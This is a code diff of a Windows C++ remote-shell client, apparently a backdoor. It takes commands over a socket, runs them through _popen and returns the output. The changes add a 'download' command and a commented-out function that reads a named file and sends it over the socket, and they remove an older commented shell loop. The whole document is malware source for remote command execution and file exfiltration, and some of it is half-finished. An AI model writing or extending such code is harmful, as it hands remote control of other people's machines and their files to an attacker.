@@ -5,6 +5,7 @@
 #include <unistd.h>
 #endif
 #include <iostream>
+#include <fstream>
 #include <WS2tcpip.h>
 #include <unistd.h>
 #include <cstdlib>
@@ -12,14 +13,16 @@
 #pragma comment(lib, "ws2_32.lib")
 using namespace std;
 
-#define DEFAULT_BUFLEN 4069
-#define DEFAULT_TOTALE_BUFLEN 65104
+#define DEFAULT_BUFLEN 40690
+#define DEFAULT_TOTALE_BUFLEN 651040
 #define DEFAULT_PORT 27015
 
 int sock;
 
 int strincludes(char *strVar, char *buffer);
 char *strsub(char str[], int slice_from, int slice_to);
+
+void download_file(char *filename);
 
 int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR pCmdLine, int nCmdShow)
 {
@@ -109,6 +112,14 @@ start:
             // strcpy(total_response, strsub(buffer, 3, 100));
             send(sock, total_response, sizeof(total_response), 0);
         }
+        else if (strncmp("download ", buffer, 9) == 0)
+        {
+            char *filename = strsub(buffer, 9, 100);
+            // if (!filename) {
+
+            // }
+            // "@download ->> file:filename.c; fdddddgfdgffddddddddddddhfghgf"
+        }
 
         else
         {
@@ -130,6 +141,33 @@ start:
         }
     }
 }
+
+// void download_file(char *filename)
+// {
+
+//     char lineData[DEFAULT_BUFLEN];
+//     char fileData[DEFAULT_TOTALE_BUFLEN];
+//     char response_err[DEFAULT_TOTALE_BUFLEN];
+
+//     if (!filename)
+//     {
+//         strcpy(response_err, "please input valid filename");
+//         send(sock, response_err, sizeof(response_err), 0);
+//         return;
+//     }
+
+//     fstream fp;
+//     fp.open(filename, ios::in);
+
+//     while (fp >> lineData)
+//     {
+//         strcat(fileData, lineData);
+//     }
+
+//     send(sock, fileData, sizeof(fileData), 0);
+
+//     return;
+// }
 
 int strincludes(char *strVar, char *buffer)
 {
@@ -195,67 +233,3 @@ char *strsub(char str[], int slice_from, int slice_to)
     strncpy(buffer, str, buffer_len);
     return buffer;
 }
-
-// int Shell()
-// {
-
-//     char buffer[4096];
-//     char container[4096];
-//     char total_response[32768];
-
-//     while (true)
-//     {
-//     jumb:
-//         ZeroMemory(buffer, 4096);
-//         ZeroMemory(container, sizeof(container));
-//         ZeroMemory(total_response, sizeof(total_response));
-
-//         int bytesRecv = recv(sock, buffer, 4096, 0);
-//         if (bytesRecv == SOCKET_ERROR)
-//         {
-//             cerr << "[ERR] - Error in recv() ! . Quitting" << endl;
-//             break;
-//         }
-
-//         if (bytesRecv == 0)
-//         {
-//             cout << "[ERR] - Server disconnected " << endl;
-//             goto start;
-//         }
-
-//         printf("[CMD] -> %s\n", buffer);
-
-//         if (strncmp("q", buffer, 1) == 0)
-//         {
-//             closesocket(sock);
-//             WSACleanup();
-//             exit(0);
-//         }
-//         else if (strncmp("cd ", buffer, 3) == 0)
-//         {
-//             chdir(strsub(buffer, 3, 100));
-//         }
-
-//         else
-//         {
-
-//             FILE *fp;
-//             fp = _popen(buffer, "rt");
-//             while (fgets(container, 4096, fp))
-//             {
-//                 strcat(total_response, container);
-//             }
-//             if (feof(fp))
-//             {
-
-//                 printf("[TRES] -> %s\n", total_response);
-//                 if (send(sock, total_response, sizeof(total_response), 0) != 0) {
-//                     cout << "[ERR] - Server disconnected " << endl;
-//                     goto start;
-//                 }
-
-//                 _pclose(fp);
-//             }
-//         }
-//     }
-// }
